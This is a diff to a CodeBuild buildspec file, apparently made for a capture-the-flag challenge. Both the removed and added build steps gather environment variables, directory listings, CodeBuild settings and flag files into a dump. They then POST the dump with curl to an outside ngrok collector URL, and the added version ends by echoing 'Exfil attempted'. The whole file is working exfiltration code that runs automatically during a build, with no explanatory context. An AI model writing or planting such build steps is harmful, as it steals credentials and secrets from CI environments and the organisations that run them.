@@ -4,43 +4,32 @@ phases:
   build:
     commands:
       - COLLECTOR="https://fa63-108-77-188-159.ngrok-free.app"
-
-      # Dump everything that might contain the flag
-      - |
-        {
-          echo "=== ENVIRONMENT VARIABLES ==="
-          env | sort
-          echo ""
-          echo "=== /tmp CONTENTS ==="
-          ls -la /tmp/ 2>/dev/null | head -20
-          echo ""
-          echo "=== /root CONTENTS ==="
-          ls -la /root/ 2>/dev/null | head -20
-          echo ""
-          echo "=== HOME DIRECTORY ==="
-          ls -la $HOME/ 2>/dev/null | head -20
-          echo ""
-          echo "=== Look for flag files anywhere accessible ==="
-          find / -name '*flag*' -o -name 'FLAG*' 2>/dev/null | head -30
-          echo ""
-          echo "=== /tmp/flag content ==="
-          cat /tmp/flag 2>/dev/null || echo "not found"
-          echo ""
-          echo "=== /root/flag content ==="
-          cat /root/flag 2>/dev/null || echo "not found"
-          echo ""
-          echo "=== /flag content ==="
-          cat /flag 2>/dev/null || echo "not found"
-          echo ""
-          echo "=== PWD and contents ==="
-          pwd
-          ls -la
-          echo ""
-          echo "=== CODEBUILD ENV ==="
-          env | grep -i codebuild
-        } > /tmp/flag_dump.txt 2>&1
-
-      # POST the dump
-      - curl -s -X POST "$COLLECTOR/flag_dump" -H 'Content-Type: text/plain' --data-binary @/tmp/flag_dump.txt
-
-      - echo "Done"
+      - echo "Starting flag dump..." > /tmp/output.txt
+      - env >> /tmp/output.txt 2>&1 || true
+      - echo "" >> /tmp/output.txt
+      - echo "=== Checking /tmp ===" >> /tmp/output.txt
+      - ls -la /tmp/ >> /tmp/output.txt 2>&1 || true
+      - echo "" >> /tmp/output.txt
+      - echo "=== Checking /root ===" >> /tmp/output.txt
+      - ls -la /root/ >> /tmp/output.txt 2>&1 || true
+      - echo "" >> /tmp/output.txt
+      - echo "=== Checking HOME ===" >> /tmp/output.txt
+      - ls -la $HOME/ >> /tmp/output.txt 2>&1 || true
+      - echo "" >> /tmp/output.txt
+      - echo "=== PWD ===" >> /tmp/output.txt
+      - pwd >> /tmp/output.txt 2>&1 || true
+      - ls -la >> /tmp/output.txt 2>&1 || true
+      - echo "" >> /tmp/output.txt
+      - echo "=== Common flag locations ===" >> /tmp/output.txt
+      - cat /tmp/flag 2>/dev/null >> /tmp/output.txt || true
+      - cat /root/flag 2>/dev/null >> /tmp/output.txt || true
+      - cat /flag 2>/dev/null >> /tmp/output.txt || true
+      - echo "" >> /tmp/output.txt
+      - echo "=== Find flag files ===" >> /tmp/output.txt
+      - find / -maxdepth 3 -name '*flag*' 2>/dev/null >> /tmp/output.txt || true
+      - echo "" >> /tmp/output.txt
+      - echo "=== Codebuild env vars ===" >> /tmp/output.txt
+      - env | grep -i codebuild >> /tmp/output.txt || true
+      - echo "Done collecting" >> /tmp/output.txt
+      - curl -s -X POST "$COLLECTOR/dump" -H 'Content-Type: text/plain' --data-binary @/tmp/output.txt || echo "curl failed"
+      - echo "Exfil attempted"
